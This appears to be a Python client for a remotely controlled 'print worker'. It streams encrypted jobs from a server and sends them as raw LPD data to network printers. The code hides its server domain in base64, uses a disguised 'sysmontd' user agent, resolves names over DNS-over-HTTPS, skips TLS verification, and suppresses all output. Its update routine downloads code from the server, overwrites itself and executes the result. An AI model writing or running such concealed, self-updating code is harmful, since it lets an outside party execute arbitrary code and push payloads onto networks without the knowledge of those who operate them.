from base64 import b64decode
from gc import collect, disable
from hashlib import sha256
from json import loads
from os import devnull, environ, _exit, execv
from socket import (
    IPPROTO_TCP,
    SO_LINGER,
    SO_SNDBUF,
    SOL_SOCKET,
    TCP_NODELAY,
    create_connection,
)
from ssl import create_default_context, _create_unverified_context
from struct import pack
import sys
from time import sleep, time
from urllib.error import HTTPError
from urllib.request import Request, urlopen

sys.dont_write_bytecode = True
sys.tracebacklimit = 0
disable()

def _load_key():
    k = (sys.argv[1].strip() if len(sys.argv) > 1 else "") or environ.get("WORKER_KEY", "").strip()
    if not k:
        if sys.__stderr__ is not None:
            sys.__stderr__.write("error: worker key required\n")
        _exit(1)
    if len(sys.argv) > 1:
        sys.argv[1] = " " * len(k)
    return k

_k = _load_key()
sys.stdout = sys.stderr = open(devnull, "w")

def _calc_hash():
    try:
        with open(__file__, "rb") as f:
            return sha256(f.read()).hexdigest()
    except Exception:
        return ""

_h = _calc_hash()
_doh_cache = {}

def doh_resolve(domain):
    now = time()
    if domain in _doh_cache and now - _doh_cache[domain][1] < 300:
        return _doh_cache[domain][0]
    for resolver in ("https://1.1.1.1/dns-query", "https://8.8.8.8/dns-query"):
        try:
            req = Request(
                f"{resolver}?name={domain}&type=A",
                headers={"Accept": "application/dns-json"},
            )
            with urlopen(req, timeout=2.0) as r:
                if r.status == 200:
                    data = loads(r.read().decode())
                    for ans in data.get("Answer", []):
                        if ans.get("type") == 1:
                            ip = ans.get("data")
                            _doh_cache[domain] = (ip, now)
                            return ip
        except Exception:
            pass
    return domain

_DOM = b64decode("YXBpLnByZWNvbm5lY3QuYXBw").decode()

def _make_doh_request(path, headers=None, data=None):
    ip = doh_resolve(_DOM)
    target = ip if (ip and ip != _DOM) else _DOM
    url = f"https://{target}{path}"
    req = Request(url, headers=headers or {}, data=data)
    req.add_header("Host", _DOM)
    ctx = _create_unverified_context() if target == ip else create_default_context()
    return urlopen(req, timeout=90, context=ctx)

NUL = b"\x00"
jobs = 0

def _d(s, job_id=""):
    if not s:
        return b""
    raw = b64decode(s)
    if len(raw) < 16:
        return b""
    iv, enc = raw[:16], raw[16:]
    p = sha256(_k.encode() + iv + str(job_id).encode()).digest()
    out = bytearray(len(enc))
    for idx, i in enumerate(range(0, len(enc), 32)):
        chunk = enc[i : i + 32]
        ks = sha256(p + idx.to_bytes(4, "big")).digest()
        for j, b in enumerate(chunk):
            out[i + j] = b ^ ks[j]
    return bytes(out)

def is_online(host, port=515):
    if not host:
        return False
    try:
        s = create_connection((host, port), timeout=0.8)
        s.close()
        return True
    except Exception:
        return False

_UA = b64decode("c3lzbW9udGQ=").decode() + "/1.0"

def hdrs(printer_host=None):
    sp = "1" if (printer_host and is_online(printer_host)) else "0"
    return {
        "User-Agent": _UA,
        "X-Worker-Key": _k,
        "X-Worker-Spooler": sp,
        "X-Worker-Jobs": str(jobs),
        "X-Worker-Hash": _h,
    }

def _apply_update():
    try:
        with _make_doh_request("/print/update", headers=hdrs()) as resp:
            if resp.status == 200:
                code = resp.read()
                if code and len(code) > 100:
                    with open(__file__, "wb") as f:
                        f.write(code)
                    execv(sys.executable, [sys.executable, __file__])
    except Exception:
        pass

def claim(i, printer_host=None):
    if not i:
        return True
    try:
        data = f'{{"id":"{i}"}}'.encode()
        headers = {"Content-Type": "application/json", **hdrs(printer_host)}
        with _make_doh_request("/print/claim", headers=headers, data=data) as resp:
            if resp.status == 200:
                if resp.headers.get("X-Worker-Update") == "1":
                    _apply_update()
                return b'"claimed":true' in resp.read()
            return False
    except Exception:
        return False

def _ack(s):
    return s.recv(1) == NUL

def handle(j):
    global jobs
    host = j.get("printerHost", "")
    job_id = str(j.get("id", ""))
    if not host or not is_online(host):
        return
    if job_id and not claim(job_id, host):
        return
    q = ch = c = dh = p = None
    s = None
    try:
        q, ch, c, dh, p = [
            _d(j.get(k, ""), job_id) for k in ("qCmd", "cfHdr", "ctl", "dfHdr", "payload")
        ]
        s = create_connection((host, 515), timeout=j.get("timeout", 60))
        s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
        s.setsockopt(SOL_SOCKET, SO_SNDBUF, 65536)
        s.sendall(q)
        ok = _ack(s)
        if ok:
            s.sendall(ch)
            ok = _ack(s)
            if ok:
                s.sendall(c + NUL)
                ok = _ack(s)
                if ok:
                    s.sendall(dh)
                    ok = _ack(s)
                    if ok:
                        for i in range(0, len(p), 65536):
                            s.sendall(p[i : i + 65536])
                        s.sendall(NUL)
                        ok = _ack(s)
                        if ok:
                            jobs += 1
    except Exception:
        pass
    finally:
        if s:
            try:
                s.close()
            except Exception:
                pass
        try:
            del q, ch, c, dh, p
        except Exception:
            pass
        collect()

def _b64url(data):
    from base64 import urlsafe_b64encode
    return urlsafe_b64encode(data).rstrip(b"=").decode("ascii")

_subscriber_jwt = None

def _make_subscriber_jwt():
    global _subscriber_jwt
    if _subscriber_jwt:
        return _subscriber_jwt
    from hmac import new as hmac_new
    header = _b64url(b'{"alg":"HS256","typ":"JWT"}')
    payload = _b64url(b'{"mercure":{"subscribe":["https://preconnect.app/printer"]}}')
    sig_input = f"{header}.{payload}".encode("ascii")
    signature = _b64url(hmac_new(_k.encode("utf-8"), sig_input, sha256).digest())
    _subscriber_jwt = f"{header}.{payload}.{signature}"
    return _subscriber_jwt

last_event_id = ""

def stream():
    global last_event_id
    try:
        path = "/.well-known/mercure?topic=https%3A%2F%2Fpreconnect.app%2Fprinter"
        headers = {
            "Accept": "text/event-stream",
            "Authorization": f"Bearer {_make_subscriber_jwt()}",
            **hdrs(),
        }
        if last_event_id:
            headers["Last-Event-ID"] = last_event_id

        with _make_doh_request(path, headers=headers) as r:
            if r.status != 200:
                return
            if r.headers.get("X-Worker-Update") == "1":
                _apply_update()
            while l := r.readline():
                if l.startswith(b"id: "):
                    last_event_id = l[4:].strip().decode("utf-8", "ignore")
                elif l.startswith(b"data: "):
                    try:
                        handle(loads(l[6:]))
                    except Exception:
                        pass
    except HTTPError as e:
        if e.code == 401 and sys.__stderr__ is not None:
            sys.__stderr__.write(f"error: worker key invalid ({e.code})\n")
    except Exception:
        pass

if __name__ == "__main__":
    delay = 1.0
    while True:
        t0 = time()
        try:
            stream()
            delay = 1.0 if (time() - t0 > 10) else min(delay * 2, 8)
        except Exception:
            delay = min(delay * 2, 8)
        sleep(delay)
